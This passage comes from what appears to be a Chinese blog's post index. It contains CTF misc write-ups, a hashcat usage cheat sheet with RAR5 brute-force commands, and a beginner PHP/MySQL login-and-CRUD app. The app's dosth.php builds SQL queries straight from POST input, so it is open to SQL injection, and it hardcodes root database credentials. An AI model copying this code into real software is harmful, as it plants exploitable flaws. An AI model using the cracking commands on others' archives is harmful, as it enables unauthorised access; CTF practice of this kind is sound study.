8AXAB1AC0ANgA1ADQAMgAyAD8A&quot;$bytes  &#x3D; [System.Convert]::FromBase64String($string);$decoded &#x3D; [System.Text.Encoding]::UTF8.GetString($bytes); echo $decoded\n根据代码，cyberchef经过from base64操作后得到\nRTF格式下的unicode编码\n附上官方脚本：\ns&#x3D;r&quot;\\u-65432?\\u-65420?\\u-65420?\\u-65424?\\u-65421?\\u-65478?\\u-65489?\\u-65489?\\u-65418?\\u-65426?\\u-65437?\\u-65420?\\u-65434?\\u-65491?\\u-65486?\\u-65487?\\u-65485?\\u-65491?\\u-65487?\\u-65486?\\u-65483?\\u-65481?\\u-65488?\\u-65482?\\u-65487?\\u-65487?\\u-65486?\\u-65485?\\u-65490?\\u-65437?\\u-65425?\\u-65421?\\u-65490?\\u-65439?\\u-65424?\\u-65491?\\u-65426?\\u-65439?\\u-65426?\\u-65430?\\u-65431?\\u-65426?\\u-65433?\\u-65490?\\u-65427?\\u-65415?\\u-65423?\\u-65437?\\u-65428?\\u-65425?\\u-65419?\\u-65436?\\u-65490?\\u-65437?\\u-65425?\\u-65427?\\u-65489?\\u-65456?\\u-65415?\\u-65425?\\u-65426?\\u-65433?\\u-65415?\\u-65439?\\u-65426?\\u-65433?\\u-65499?\\u-65486?\\u-65488?\\u-65421?\\u-65420?\\u-65425?\\u-65422?\\u-65435?\\u-65421?\\u-65499?\\u-65486?\\u-65488?\\u-65428?\\u-65425?\\u-65417?\\u-65499?\\u-65486?\\u-65488?\\u-65425?\\u-65426?\\u-65499?\\u-65486?\\u-65488?\\u-65434?\\u-65425?\\u-65422?\\u-65435?\\u-65431?\\u-65433?\\u-65426?\\u-65499?\\u-65486?\\u-65488?\\u-65433?\\u-65425?\\u-65425?\\u-65436?\\u-65421?\\u-65499?\\u-65486?\\u-65488?\\u-65439?\\u-65427?\\u-65431?\\u-65436?\\u-65499?\\u-65486?\\u-65488?\\u-65458?\\u-65425?\\u-65422?\\u-65420?\\u-65432?\\u-65499?\\u-65486?\\u-65488?\\u-65461?\\u-65425?\\u-65422?\\u-65435?\\u-65439?\\u-65426?\\u-65499?\\u-65486?\\u-65488?\\u-65469?\\u-65457?\\u-65450?\\u-65463?\\u-65468?\\u-65491?\\u-65487?\\u-65479?\\u-65499?\\u-65486?\\u-65488?\\u-65424?\\u-65439?\\u-65422?\\u-65439?\\u-65426?\\u-65425?\\u-65431?\\u-65439?\\u-65490?\\u-65422?\\u-65439?\\u-65422?&quot;l&#x3D;list(s[3:-1].split(r&quot;?\\u-&quot;))flag&#x3D;&quot;&quot;for i in l:    flag+&#x3D;chr(65536-int(i))print(flag)\n运行后得到\nhttps:&#x2F;&#x2F;vnctf-213-1257061123.cos.ap-nanjing.myqcloud.com&#x2F;Pyongyang%20stores%20low%20on%20foreign%20goods%20amid%20North%20Korean%20COVID-19%20paranoia.rar\n一个加密的压缩包，提示密码：\nmaskcodeThe password is: four digits\nARCHPR爆破无果。\n得到一个工具Accent RAR Password Recovery，发现【编码与密码】的压缩包里有，只不过存在版本问题，附上下载链接：https://gd.jisuxz.com/down_new/accent_rar_password_recovery.rar\n但因为是英文版，就添加了【编码与密码】里的chinese.lng，再运行.reg文件\n同时根据https://www.muruoxi.com/pc/2253.html修复报错\n\n利用密码【9705】打开压缩包，得到Pyongyang stores low on foreign goods amid North Korean COVID-19 paranoia.docx\n更改后缀名.zip\n解压后打开word&gt;hideinfo.xml\n\n宽字符隐写得\nvnctf&#123;APT_1S_c0M1nG\n第二部分图片：\n另存为ThisIsSecret.jpg\n用工具OurSecret\n解密下半部分\n_fr0m_l@z@RuS&#125;\nvnctf&#123;APT_1S_c0M1nG_fr0m_l@z@RuS&#125;","tags":["challenge","MISC"]},{"title":"Nep2021","url":"/2021/03/25/Nep2021/","content":"1\n\n\nsharun：这题有很多解啊\n\n本次涅普MISC的感受是，考点不难，只要找到点和合适的工具就能出。恍然大悟\n签到题是这样的\nflag &#x3D;[0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff,0xffffffffffffffffffffff...\n第一次尝试可能是异或，想了想后发现如上所示，大部分是0xf，是相同的字符，奇怪\n第二次尝试直接转十六进制，全是不可见字符，失败\n第三次觉得可能是纯几何的图案题：\n\n但是总觉得差一口气\n第四次尝试回到了第二次的思路，进制转换看看。\n\n看不出来名堂，便开始玩了。\n\n有意思嘿。隐隐约约能看到NEP字样。\n把内容移到sublime\n因为它的文字内容能够根据应用边距的变化而变化。\n不断调整\n\n看到希望了！\n\nNep&#123;Y0u_ar3_50_cl3ver!&#125;\n解出来之后想起一道相似的入门题。\n2\n\n\n我把茶包的出题日记找到了，里面居然有！！！\n\n得到出题人日记.zip\n解压得xlsx\n根据经验更改后缀为.zip\nwinrar打开看到\n隐写.wf pna fbyir guvf ceboyrz\n怀疑栅栏\n\n打开/xl\n\n在shareStrings.xml里看到日记内容\n重点在于：\n-&lt;si&gt;&lt;t&gt;菜鸡的第十八天日记&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;-&lt;si&gt;&lt;t&gt;前言：好像是这个女人，但是又好像不是这个女人诶，我好像找到她了！&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;-&lt;si&gt;&lt;t&gt;rot13是个好东西不是吗？&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;-&lt;si&gt;&lt;t&gt;flag在里面啦！！！大佬们再找找？？？&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;-&lt;si&gt;&lt;t&gt;出题第十八天&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;-&lt;si&gt;&lt;t&gt;高兴&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;-&lt;si&gt;&lt;t&gt;我好像找到了这个女人了，终于问到师傅们菜鸡可以出什么题了，她跟我说她叫fufu，然后让我把flag藏到她身上，好像很有道理的样子诶，这就把flag交给她！&lt;&#x2F;t&gt;&lt;&#x2F;si&gt;\n依次处理\n上述文本rot13后：\n隐写.js can solve this problem\n在/media里得到几张图片\n\nfufufufufufufufufuufufufufufufufufufufufufufufufufu.flag查看二进制后，更改后缀为.png\n得到与image3.gif第一帧相同的图片，猜想盲水印。对比无果。\n卡了很久。\n尝试js隐写，查询【png隐写js】类似关键字无果。\n突然想到，隐写=steganography，隐写.js=steganography.js\n查询搜索引擎得\nhttp://www.peter-eigenschink.at/projects/steganographyjs/showcase/\n秒出\n\nNep &#123;D4La0_s0lve_th1s_probl3m_to_hit_c4ij1&#125;\n3\nmake_hsy_great_again\n\nQ师傅是韩商言的粉丝，前段日子他刚组装了台新电脑，并且要求我帮他装系统，我在他电脑里发现了这个。\n\n得到加密的make hsy great again_.rar\nrar5用hashcat\n第一步：\n#rar2john hsy.rar&gt;hsy.rar:$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2\n第二步：\nhashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d\n开始爆破\n$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2:520233                                                 Session..........: hashcatStatus...........: CrackedHash.Type........: RAR5Hash.Target......: $rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98...8772c2Time.Started.....: Thu Mar 25 14:36:44 2021 (14 mins, 55 secs)Time.Estimated...: Thu Mar 25 14:51:39 2021 (0 secs)Guess.Mask.......: ?d?d?d?d?d?d [6]Guess.Queue......: 1&#x2F;1 (100.00%)Speed.#1.........:      262 H&#x2F;s (6.99ms) @ Accel:512 Loops:128 Thr:1 Vec:8Recovered........: 1&#x2F;1 (100.00%) Digests, 1&#x2F;1 (100.00%) SaltsProgress.........: 233984&#x2F;1000000 (23.40%)Rejected.........: 0&#x2F;233984 (0.00%)Restore.Point....: 23040&#x2F;100000 (23.04%)Restore.Sub.#1...: Salt:0 Amplifier:6-7 Iteration:32768-32799Candidates.#1....: 525587 -&gt; 516587\n密码【520233】，得到【hhhhhhsy.png】\n通过010editor看到格式\n\n结合png格式，编写倒置函数：\nwith open(&#x27;Untitled1&#x27;,&#x27;rb&#x27;) as f:   \twith open(&#x27;flag&#x27;,&#x27;wb&#x27;) as g:        g.write(f.read()[::-1])\n得到另一张图片【flag.png】，表面看跟已知图片一样，丢进Beyond Compare 4\n对比两张图片，得到\n\n根据提示【flag{too_young_too_simple hint Crypto}】\n找到hint Crypto脚本：\nfrom PIL import Imagefrom Crypto.Util.number import *flag=&#x27;&#x27;im = Image.open(&#x27;flag.png&#x27;)for j in range(72):    a = im.getpixel((2069,j))[3]    flag += str(a)print(long_to_bytes(flag))\n得到\nNep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;\n","tags":["challenge","MISC"]},{"title":"hashcat使用手册","url":"/2021/06/25/hashcat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","content":"hashcat使用手册\n\n写在前面\n遇到一道【羊城杯】的题，在解的过程中遇到rar5\n发现手头所有的工具都无法爆破，想起【Nep2021】的【make_hsy_great_again】\n但由于此次为掩码爆破，故而有了这篇文章，详细谈谈hashcat的使用，作为个人的学习留存。\nrar2john\n# rar2john 65.rar Created directory: &#x2F;root&#x2F;.john65.rar:$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f\nhashcat - advanced password recovery\nhashcat的基本用法为\nhashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...\n一条常见的爆破命令\nhashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d\n一条掩码爆破命令\nhashcat --force -m 13000 -a 3 &#39;$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f&#39; GW?a?a?a?a\n通过查询形成总结\n-m\t#攻击的哈希类型\nmd5系列\n   0 | MD5                                              | Raw Hash  10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated  20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated  30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and&#x2F;or Iterated  40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and&#x2F;or Iterated3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and&#x2F;or Iterated3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and&#x2F;or Iterated4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and&#x2F;or Iterated4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and&#x2F;or Iterated2600 | md5(md5($pass))                                  | Raw Hash, Salted and&#x2F;or Iterated3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and&#x2F;or Iterated4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and&#x2F;or Iterated4400 | md5(sha1($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated\nsha256系列\n1410 | sha256($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated1420 | sha256($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated\nDES,3DES\n14000 | DES (PT &#x3D; $salt, key &#x3D; $pass)                    | Raw Cipher, Known-Plaintext attack14100 | 3DES (PT &#x3D; $salt, key &#x3D; $pass)                   | Raw Cipher, Known-Plaintext attack\nCRC32校验\n11500 | CRC32                                            | Checksums\n7z,rar5,zip\n11600 | 7-Zip                                            | Archives12500 | RAR3-hp                                          | Archives13000 | RAR5                                             | Archives13600 | WinZip                                           | Archives\nTrueCrypt,VeraCrypt\n 62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)\npdf系列\n10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents\ntext\n99999 | Plaintext                                        | Plaintext\n-a\t#攻击模式\n- [ Attack Modes ] -  # | Mode &#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  0 | Straight\t\t\t\t\t# 字典破解  1 | Combination\t\t\t\t# 组合破解  3 | Brute-force\t\t\t\t# 掩码暴力破解  6 | Hybrid Wordlist + Mask\t # 混合字典+掩码  7 | Hybrid Mask + Wordlist\t # 混合掩码+字典\n?\t#攻击模式\n- [ Built-in Charsets ] -  ? | Charset &#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  l | abcdefghijklmnopqrstuvwxyz  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ  d | 0123456789  h | 0123456789abcdef  H | 0123456789ABCDEF  s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\\]^_&#96;&#123;|&#125;~  a | ?l?u?d?s  b | 0x00 - 0xff\n​\n","tags":["MISC"]},{"title":"web1","url":"/2020/12/05/web1/","content":"第一个网页\n\n做的不好，花了很长时间才想明白一些很简单的道理。简单记录\n\n\n连接数据库\n\n用纯Php实现的时候，打开phpstudy直接开干。html+php的模式中采用了phpstudy+Navicat+Intellij IDEA的方式。\n先用phpstudy打开Apache和MySQL服务，Navicat中可以直观地看到本地数据库。IDEA中编写代码：\n首先是明确整体框架。实现的功能是：1）指定的用户才能登录2）增删改查3）显示结果\n设计页面功能：在经过调整和构思后，最终定的效果是1）登录2）显示结果及增删改查按钮3）返回\n其中第二张网页和第三张在功能上还可以进行进一步优化，只是目前笔者还无法实现这一点。\nlogin.html\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&#x2F;&gt;    &lt;title&gt;Ginkgo_Login&lt;&#x2F;title&gt;    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;style.css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;form class&#x3D;&quot;box&quot; action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;admin.php&quot; method&#x3D;&quot;post&quot;&gt;        &lt;img src&#x3D;&quot;image&#x2F;MiniGoldLogo.png&quot; width&#x3D;&quot;180px&quot; height&#x3D;&quot;100px&quot;&gt;        &lt;span&gt;&lt;h1&gt;Login&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;        &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;账户&quot; name&#x3D;&quot;admin&quot;&gt;        &lt;br&#x2F;&gt;        &lt;input type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;密码&quot; name&#x3D;&quot;passwd&quot;&gt;        &lt;br&#x2F;&gt;        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;确定&quot;&gt;    &lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\nstyle.css\nbody&#123;    margin:0;    padding:0;    font-family:sans-serif ;    background: #34495e;&#125;.box&#123;    width:300px;    padding:40px;    position: absolute;    top:50%;    left:50%;    transform:translate(-50%,-50%);    background: #191919;    text-align:center;&#125;.box h1&#123;    color:white;    text-transform: none;    font-weight: 500;&#125;.box input[type&#x3D;&quot;text&quot;],.box input[type&#x3D;&quot;password&quot;]&#123;    border: 0;    background: none;    display: block;    margin:20px auto;    text-align: center;    border: 2px solid #3498db;    padding:14px 10px;    width:200px;    outline:none;    color:white;    border-radius: 240px;    transition: 0.25s;&#125;.box input[type&#x3D;&quot;text&quot;]:focus,.box input[type&#x3D;&quot;password&quot;]:focus&#123;    width:280px;    border-color:#F5B041;&#125;.box input[type&#x3D;&quot;submit&quot;]&#123;    border:0;    background: none;    display: block;    margin: 20px auto;    text-align: center;    border: 2px solid #F5B041;    padding:14px 40px;    outline:none;    color:white;    border-radius: 240px;    transition:0.25s;    cursor:pointer;&#125;.box input[type&#x3D;&quot;submit&quot;]:hover&#123;    background: none;&#125;\n以上两段代码实现了对登录界面的优化及跳转到第二张网页的功能。至于验证用户的功能则安排在了下一部分代码中：\nadmin.php\n&lt;?phpfunction conn()&#123;    header(&quot;content-type:text&#x2F;html;charset&#x3D;utf8&quot;);    $conn &#x3D; new mysqli(&#39;localhost&#39;, &#39;root&#39;, &#39;Phpstudy&#39;, &#39;test&#39;);    if ($conn-&gt;connect_error) &#123;        die(&quot;连接失败&quot; . $conn-&gt;connect_error);        echo &quot;&lt;script&gt; alert(&#39;连接失败&#39;)&lt;&#x2F;script&gt;&quot;;    &#125;    if (preg_match(&quot;&#x2F;^\\w&#123;1,20&#125;$&#x2F;&quot;, $_POST[&#39;admin&#39;], $matches)) &#123;        if (preg_match(&quot;&#x2F;^\\w&#123;1,20&#125;$&#x2F;&quot;, $_POST[&#39;passwd&#39;], $matches)) &#123;            $login_sql &#x3D; &quot;SELECT * FROM &#96;admin&#96; WHERE &#96;id&#96;&#x3D;&quot; . &quot;\\&quot;&#123;$_POST[&#39;admin&#39;]&#125;\\&quot;&quot; . &quot;AND &#96;passwd&#96;&#x3D;&quot; . &quot;\\&quot;&#123;$_POST[&#39;passwd&#39;]&#125;\\&quot;&quot;;            $login_result &#x3D; $conn-&gt;query($login_sql);        &#125;    &#125;    else    &#123;        echo &quot;&lt;script&gt;alert(&#39;输入异常&#39;)&lt;&#x2F;script&gt;&quot;;        echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;history.go(-1)&lt;&#x2F;script&gt;&quot;;   &#x2F;&#x2F;此方法直接返回    &#125;        if($login_result-&gt;num_rows&gt;0||$_POST[&#39;goto&#39;]) &#123;            find($conn);    &#125;    return($conn);    $conn-&gt;close();&#125;function find($conn)&#123;    $sql &#x3D; &quot;SELECT * FROM &#96;member&#96; ORDER BY &#96;num&#96;&quot;;    $result &#x3D; $conn-&gt;query($sql);    if ($result-&gt;num_rows &gt; 0) &#123;        while ($row &#x3D; $result-&gt;fetch_assoc()) &#123;            echo &quot;Id:   &quot; . $row[&quot;id&quot;] . &quot;  &quot;;            echo &quot;Grade:    &quot; . $row[&quot;grade&quot;] . &quot;&lt;br&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;无数据&quot;;    &#125;&#125;?&gt;\n这里笔者还添加了一段用于防止sql注入的代码，目前的测试是有效的，只允许输入字母数字下划线构成的1到20位字符。但专业的测试人员还没介入，暂时不敢说大话。\n登录界面\n\n简单注入语句\n\n\n密码错误时\n\n\nadmin.php中的下半部分代码：\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang&#x3D;&quot;en&quot;&gt;    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&#x2F;&gt;    &lt;title&gt;Ginkgo_Login&lt;&#x2F;title&gt;    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;admin.css&quot;&gt;    &lt;style&gt;        body&#123;            margin:0px;        &#125;        div#container&#123;            width:100%;            height:750px;            background-color: #34495e;        &#125;        div#header&#123;            width:100%;            height: 30%;            background-color: #34495e;        &#125;        div#menu&#123;            width:60%;            height:67%;            background-color: #F5B041;        &#125;        div#content&#123;            width:40%;            height: 67%;            background-color: white;        &#125;        div#footer&#123;            width:100%;            height:3%;            background-color: gray;        &#125;    &lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div id&#x3D;&quot;container&quot;&gt;    &lt;div id&#x3D;&quot;header&quot; align&#x3D;&quot;middle&quot; &gt;        &lt;img src&#x3D;&quot;image&#x2F;MiniGoldLogo.png&quot; width&#x3D;&quot;200px&quot; height&#x3D;&quot;120px&quot;&gt;        &lt;span&gt;&lt;h1 style&#x3D;&quot;color: white&quot;&gt;                    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;                        var today&#x3D;new Date();                        var hour&#x3D;today.getHours();                        var times &#x3D; &quot;&quot;;                        if(hour &gt;5 &amp; hour &lt;&#x3D;11)&#123;                            times&#x3D;&quot;上午好&quot;;                        &#125;                        else if(hour&gt;11&amp;hour&lt;&#x3D;14)&#123;t                            times&#x3D;&quot;中午好&quot;;                        &#125;                        else if(hour&gt;14 &amp;hour&lt;&#x3D;18)&#123;                            times&#x3D;&quot;下午好&quot;;                        &#125;                        else if(hour&gt;18&amp;hour&lt;&#x3D;24)&#123;                            times&#x3D;&quot;晚上好&quot;;                        &#125;                        &#x2F;&#x2F;document.write(hour);                        document.write(times);                    &lt;&#x2F;script&gt;                ,admin            &lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;    &lt;&#x2F;div&gt;    &lt;div id&#x3D;&quot;menu&quot; style&#x3D;&quot;float:left;&quot;&gt;        &lt;?php conn();?&gt;    &lt;&#x2F;div&gt;    &lt;div id&#x3D;&quot;content&quot; style&#x3D;&quot;float:right;&quot;&gt;        &lt;form class&#x3D;&quot;box&quot; action&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;dosth.php&quot; method&#x3D;&quot;post&quot;&gt;            &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;ID&quot; name&#x3D;&quot;id&quot;&gt;            &lt;input type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Grade&quot; name&#x3D;&quot;grade&quot;&gt;            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;add&quot;&gt;            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;delete&quot; &gt;            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;change&quot; &gt;            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;find&quot; &gt;        &lt;&#x2F;form&gt;    &lt;&#x2F;div&gt;    &lt;div id&#x3D;&quot;footer&quot; style&#x3D;&quot;clear:both;text-align:center;&quot;&gt;        ©版权所有&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;\n对前端进行了简单的设计，使其与login界面相对和谐。并根据系统的当前时间设置了对应的欢迎语。\n\n增删改查的具体代码在dosth.php中：\n&lt;?phpfunction dosth()&#123;$q&#x3D;isset($_POST[&#39;action&#39;])?htmlspecialchars($_POST[&#39;action&#39;]):&quot;&quot;;echo $q.&quot;&lt;br&gt;&quot;;if($q)&#123;    $conn &#x3D; new mysqli(&#39;localhost&#39;, &#39;root&#39;, &#39;Phpstudy&#39;, &#39;test&#39;);    if($q&#x3D;&#x3D;&#39;add&#39;)&#123;        $sql &#x3D; &quot;SELECT * FROM &#96;member&#96; WHERE &#96;id&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;;        $result&#x3D;mysqli_query($conn,$sql);        $row_cnt&#x3D;mysqli_num_rows($result);        if($row_cnt &gt; 0)&#123;            echo &quot;&lt;script&gt;alert(&#39;该id已存在&#39;)&lt;&#x2F;script&gt;&quot;;            echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;history.go(-1)&lt;&#x2F;script&gt;&quot;;   &#x2F;&#x2F;此方法直接返回        &#125;elseif($row_cnt &#x3D;&#x3D; 0)&#123;            $sql &#x3D; &quot;INSERT INTO &#96;member&#96;(&#96;id&#96;,&#96;grade&#96;) VALUES(&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;.&quot;,&quot;.&quot;\\&quot;&#123;$_POST[&#39;grade&#39;]&#125;\\&quot;&quot;.&quot;)&quot;;            echo &quot;id: &quot; . $_POST[&quot;id&quot;] . &quot; - grade: &quot; . $_POST[&quot;grade&quot;]  . &quot;&lt;br&gt;&quot;;        &#125;    &#125;    elseif ($q&#x3D;&#x3D;&#39;delete&#39;)&#123;        $sql &#x3D; &quot;SELECT * FROM &#96;member&#96; WHERE &#96;id&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;;        $result&#x3D;mysqli_query($conn,$sql);        $row_cnt&#x3D;mysqli_num_rows($result);        if($row_cnt &gt; 0)&#123;            $sql&#x3D; &quot;DELETE FROM &#96;member&#96; WHERE &#96;id&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;;            while($row &#x3D; mysqli_fetch_assoc($result)) &#123;                echo &quot;id: &quot; . $row[&quot;id&quot;] . &quot; - grade: &quot; . $row[&quot;grade&quot;]  . &quot;&lt;br&gt;&quot;;            &#125;        &#125;elseif($row_cnt &#x3D;&#x3D; 0)&#123;            echo &quot;&lt;script&gt;alert(&#39;无此用户&#39;)&lt;&#x2F;script&gt;&quot;;            echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;history.go(-1)&lt;&#x2F;script&gt;&quot;;   &#x2F;&#x2F;此方法直接返回        &#125;    &#125;    elseif ($q&#x3D;&#x3D;&#39;change&#39;)&#123;        $sql &#x3D; &quot;SELECT * FROM &#96;member&#96; WHERE &#96;id&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;;        $result&#x3D;mysqli_query($conn,$sql);        $row_cnt&#x3D;mysqli_num_rows($result);        if($row_cnt &gt; 0)&#123;            $sql&#x3D; &quot;UPDATE &#96;member&#96; SET &#96;grade&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;grade&#39;]&#125;\\&quot;&quot;.&quot; WHERE &#96;id&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;;                echo &quot;id: &quot; . $_POST[&quot;id&quot;] . &quot; - grade: &quot; . $_POST[&quot;grade&quot;]  . &quot;&lt;br&gt;&quot;;        &#125;elseif($row_cnt &#x3D;&#x3D; 0)&#123;            echo &quot;&lt;script&gt;alert(&#39;无此用户&#39;)&lt;&#x2F;script&gt;&quot;;            echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;history.go(-1)&lt;&#x2F;script&gt;&quot;;   &#x2F;&#x2F;此方法直接返回        &#125;    &#125;    elseif($q&#x3D;&#x3D;&#39;find&#39;)&#123;        $sql &#x3D; &quot;SELECT * FROM &#96;member&#96; WHERE &#96;id&#96;&#x3D;&quot;.&quot;\\&quot;&#123;$_POST[&#39;id&#39;]&#125;\\&quot;&quot;;        $result&#x3D;mysqli_query($conn,$sql);        $row_cnt&#x3D;mysqli_num_rows($result);        if($row_cnt &#x3D;&#x3D; 0)&#123;            echo &quot;&lt;script&gt;alert(&#39;无此用户&#39;)&lt;&#x2F;script&gt;&quot;;            echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;history.go(-1)&lt;&#x2F;script&gt;&quot;;   &#x2F;&#x2F;此方法直接返回        &#125;elseif ($row_cnt &gt; 0)&#123;            while($row &#x3D; mysqli_fetch_assoc($result)) &#123;                echo &quot;id: &quot; . $row[&quot;id&quot;] . &quot; - grade: &quot; . $row[&quot;grade&quot;]  . &quot;&lt;br&gt;&quot;;            &#125;        &#125;    &#125;    $result &#x3D; $conn-&gt;query($sql);    &#x2F;&#x2F;if ($result-&gt;num_rows &gt; 0) &#123;        &#x2F;&#x2F;while ($row &#x3D; $result-&gt;fetch_assoc()) &#123;           &#x2F;&#x2F;echo &quot;Id:   &quot; . $row[&quot;id&quot;] . &quot;  &quot;;            &#x2F;&#x2F;echo &quot;Grade:    &quot; . $row[&quot;grade&quot;] . &quot;&lt;br&gt;&quot;;        &#x2F;&#x2F;&#125;    &#x2F;&#x2F;&#125; else &#123;        &#x2F;&#x2F;echo &quot;无数据&quot;;    &#x2F;&#x2F;&#125;&#125;echo &#39;SUCCESS!&#39;;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang&#x3D;&quot;en&quot;&gt;    